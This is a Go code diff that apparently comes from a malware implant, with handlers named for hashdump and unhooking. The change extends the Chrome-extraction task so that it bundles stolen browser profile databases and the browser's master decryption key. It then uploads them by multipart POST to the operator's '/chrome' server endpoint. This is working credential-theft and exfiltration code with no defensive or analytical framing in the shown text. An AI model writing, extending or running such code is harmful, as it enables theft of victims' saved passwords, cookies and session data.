@@ -343,11 +343,39 @@ func handleHashdump(task *proto.Task) *proto.TaskResult {
 }
 
 func handleChrome(task *proto.Task) *proto.TaskResult {
-	data, err := chrome.Extract(Config.ServerURL)
+	result, err := chrome.Extract(Config.ServerURL)
 	if err != nil {
 		return fail(task, err.Error())
 	}
-	return success(task, data)
+
+	trans := transport.NewHTTPTransport(&transport.Config{
+		ServerURL: Config.ServerURL,
+		UserAgent: transport.UserAgent,
+	}, task.ImplantID)
+
+	files := make(map[string][]byte)
+	for _, f := range result.Files {
+		// filename format: chrome_<Profile>_<Type>_<PID>.db or similar.
+		// The implant chrome module already names them chrome_<Type>_<PID>_<Index>.db
+		// We should inject the profile into the filename if it's not there, or metadata.
+		// chrome.go currently names them: chrome_%s_%d_%d.db (Type, PID, Index)
+		// We want to add Profile.
+		// Let's rely on the implant module's files having Profile field.
+		// We can rename them here for upload if we want.
+
+		finalName := fmt.Sprintf("%s_%s", f.Profile, f.Name)
+		files[finalName] = f.Data
+	}
+
+	fields := map[string]string{
+		"key": fmt.Sprintf("%x", result.MasterKey),
+	}
+
+	if err := trans.PostMultipart("/chrome", fields, files); err != nil {
+		return fail(task, "upload failed: "+err.Error())
+	}
+
+	return success(task, []byte(fmt.Sprintf("extracted and uploaded %d files", len(result.Files))))
 }
 
 func handleUnhook(task *proto.Task) *proto.TaskResult {
